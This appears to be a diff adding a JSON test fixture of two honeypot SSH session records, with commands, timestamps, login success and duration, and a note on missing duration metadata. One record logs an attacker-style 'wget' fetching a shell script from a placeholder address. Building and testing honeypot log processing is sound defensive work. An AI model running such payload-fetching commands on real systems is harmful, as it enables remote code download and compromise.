@@ -1,0 +1,22 @@
+[
+  {
+    "session_id": "bbeeff0202",
+    "commands": ["wget http://192.0.2.1/x.sh"],
+    "last_seen": "2026-08-26T13:00:02+00:00",
+    "first_seen": "2026-08-26T12:59:58+00:00",
+    "auth_success": true,
+    "closed": true,
+    "duration_seconds": 12.5,
+    "metadata_gaps": []
+  },
+  {
+    "session_id": "bbeeff0203",
+    "commands": ["id"],
+    "last_seen": "2026-08-26T13:10:01+00:00",
+    "first_seen": "2026-08-26T13:05:00+00:00",
+    "auth_success": false,
+    "closed": true,
+    "duration_seconds": null,
+    "metadata_gaps": ["duration_seconds: cowrie.session.closed observed but carried no usable honeypot.duration"]
+  }
+]
